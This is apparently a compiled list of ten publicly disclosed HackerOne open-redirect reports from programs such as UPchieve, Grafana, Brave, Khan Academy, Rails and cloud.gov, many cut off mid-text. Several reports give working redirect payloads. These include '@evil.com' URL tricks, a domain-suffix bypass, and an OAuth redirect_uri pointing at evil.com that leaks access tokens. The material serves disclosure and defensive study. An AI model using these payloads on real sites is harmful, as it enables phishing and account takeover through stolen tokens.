# HackerOne 实战案例：open-redirect

_10 份已披露报告（High/Critical 优先），来源 HackerOne 公开披露_

## url redirection
- 等级：Critical | 项目：UPchieve | 披露：2021-07-30 | CVE：-
- 原文：https://hackerone.com/reports/1283200

- - - - - - - - 
## Summary:
[the following url is vulnerable to redirect]
https://app.upchieve.org
## Steps To Reproduce:
when you add @evil.com the user will be directed to evil.com
https://app.upchieve.org@evil.com
## Impact
Users could get redirected to malicious domain
---


## CVE‑2025‑4123 — Grafana Open Redirect → Stored XSS → SSRF (Full Read) at ██████
- 等级：High | 项目：U.S. | 披露：2026-01-12 | CVE：CVE-2025-4123,
- 原文：https://hackerone.com/reports/3286945

- - - - - - - - 
##  Summary
**CVE‑2025‑4123** is a high‑severity vulnerability in **Grafana OSS and Enterprise** that allows unauthenticated attackers to chain multiple flaws:
* **Open Redirect** via path traversal in the public redirect handler.
* **Stored XSS** through malicious plugin injection.
* **Full‑read SSRF** if the Grafana Image Renderer plugin is installed.
This can lead to **account takeover, data theft, and internal network compromise**.
---
## 3. Affected Products
* Grafana OSS & Enterprise **8.x through 12.x**
* **Not affected**: Grafana Cloud (managed service)
* **Vulnerable configurations**:
  * Anonymous access enabled
  * Image Renderer plugin installed
  * Outbound egre


## Open redirect due to scanning QR code via brave browser
- 等级：High | 项目：Brave | 披露：2023-06-08 | CVE：CVE-2023-28364
- 原文：https://hackerone.com/reports/1946534

- - - - - - - - 
> NOTE! Thanks for submitting a report! Please fill all sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty.
## Summary:
This vulnerability was discovered in Brave's QR code scanner, which allows users to read QR codes and open corresponding links. Exploitation of this vulnerability allows attackers to direct users to malicious sites without their consent or knowledge. This vulnerability can put the security of Brave users at risk and allow them to be exposed to phishing, phishing and malware attacks. In this report, we'll describe the vulnerability in more detail, assess its 


## Bypass the fix of report #1078283 due to poor validation
- 等级：High | 项目：Khan | 披露：2021-07-08 | CVE：-
- 原文：https://hackerone.com/reports/1212337

- - - - - - - - 
Hi Khan Academy Team,
I was able to bypass the fix you implemented for report #1078283. 
The URL validation you implemented on the endpoint `continue` checks the presence of `khanacademy.org` however it doesn't have any boundary checking to ignore domains starting with `.org`, so if an attacker register a domain starting with `org` like this one `orghacker.com.br` and have a subdomain entry of `khanacademy` the attacker is able to bypass the current implementation and lead the victim to his controlled page.
# Steps to reproduce the issue
* Go to this page https://www.khanacademy.org/signup?isteacher=1&referral=LearnStorm&continue=https://khanacademy.orghacker.com.br
* You'll


## Open Redirect (6.0.0 < rails < 6.0.3.2)
- 等级：High | 项目：Ruby | 披露：2020-12-22 | CVE：CVE-2020-8264,
- 原文：https://hackerone.com/reports/904059

- - - - - - - - 
Hello,
I was looking at the change log (https://github.com/rails/rails/commit/2121b9d20b60ed503aa041ef7b926d331ed79fc2) for CVE-2020-8185 and found another problem existed.
https://github.com/rails/rails/blob/v6.0.3.1/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb#L21
[code omitted]
There was an open redirect issue because the request parameter `location` was not validated.
In 6.0.3.2, since the condition of `actionable_request?` has changed, this problem is less likely to occur.


## Stealing Users OAuth Tokens through redirect_uri parameter
- 等级：High | 项目：GSA | 披露：2019-10-01 | CVE：-
- 原文：https://hackerone.com/reports/665651

- - - - - - - - 
I found that https://login.fr.cloud.gov/oauth/authorize has vulnerability by open redirect on oauth redirect_uri which can lead to users oauth tokens being leaked to any malicious user.
Step : 
1, Clicked on link https://login.fr.cloud.gov/oauth/authorize?client_id=███&response_type=token&redirect_uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback&state=███
2, Choose any .gov account to login ( Screenshot ) then i believe you will got redirect to evil.com with oauth access token .
## Impact
Attacker can using this bug to stolen victim access token , that means he can takeover victim account .
---


## url-parse package return wrong hostname
- 等级：High | 项目：Node.js | 披露：2018-07-30 | CVE：CVE-2018-3774
- 原文：https://hackerone.com/reports/384029

- - - - - - - - 
Jul 19th 2018 -  lolwaleet submitted a report to Node.js third-party modules.
I would like to report url-parse package return wrong hostname in url-parse.
# Module
module name: url-parse
version: 1.4.1
npm page: https://www.npmjs.com/package/url-parse
## Module Description
The url-parse method exposes two different API interfaces. The url interface that you know from Node.js and the new URL interface that is available in the latest browsers.
In version 0.1 we moved from a DOM based parsing solution, using the <a> element, to a full Regular Expression solution. The main reason for this was to make the URL parser available in different JavaScript environments as you don't alwa


## Possible to redirect to a (non-existing) subdomain after logging in via GitHub (leaking the token)
- 等级：High | 项目：Ed | 披露：2017-11-25 | CVE：-
- 原文：https://hackerone.com/reports/292825

- - - - - - - - 
# Summary
To comment on an article a user has the option to login using his Github account. After logging in the user is normally redirect back to the URL he came from. I found out that it is also possible to redirect to a non-existing subdomain of edoverflow.com. It looks like the whitelist for the OAuth flow is not configured properly.
# Vulnerability Details
For logging in using the OAuth login flow the following URL is used: https://github.com/login/oauth/authorize?client_id=5f45cc999f7812d0b6d2&redirect_uri={url}&scope=public_repo . The redirect_uri parameter is matched against the configured URLs in the OAuth Application settings. I'm not sure how this is configured fo


## Identity Login Page Redirect Can Be Manipulated
- 等级：High | 项目：Inflection | 披露：2017-10-13 | CVE：-
- 原文：https://hackerone.com/reports/243474

- - - - - - - - 
The Identity.com login page could be manipulated to redirect the user to an arbitrary URL after a successful authentication.
# Researcher POC
* I used this request to try login https://www.identity.com/signin?redirect_url=%2Foauth%2Fauthorize%3Fclient_id%3D241f887e145f09298fc7f3459cefa080cd7abd30b7b0192977b5bb72965e0583%26redirect_uri%3D%252Ftest-callback%26response_type%3Dcode%26scope%3Dname%2Bemail%2Bdob%26state%3DAPPLICATION_TEST
* I put %40google.com after redirect_url= so the endpoint was like this &redirect_url=%40google.com%2Fclient_id%253D241f887e145f09298fc7f3459cefa080cd7abd30b7b0192977b5bb72965e0583%2526redirect_uri%253D%25252Ftest-callback%2526response_type%253Dc


## Open Redirect in <customer>.greenhouse.io
- 等级：High | 项目：Greenhouse.io | 披露：2017-07-08 | CVE：-
- 原文：https://hackerone.com/reports/203726

- - - - - - - - 
## Open Redirect in scout24.greenhouse.io
The **Scout24 Security Team** did a penetration test against `scout24.greenhouse.io` in order to verify how Scout24 relevant data is protected against common attack vectors. Basically we have tested the (web) application against [OWASP Top 10](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project) using industry common metholodogies. 
## Reproduction steps
* Visit https://boards.greenhouse.io/scout24 and click on some job offer (I chosed [this one](https://boards.greenhouse.io/scout24/jobs/503488))
* After completing your personal information, you can *upload* some documents
	* Click `Attach` both under *Resume/CV* and *Cove

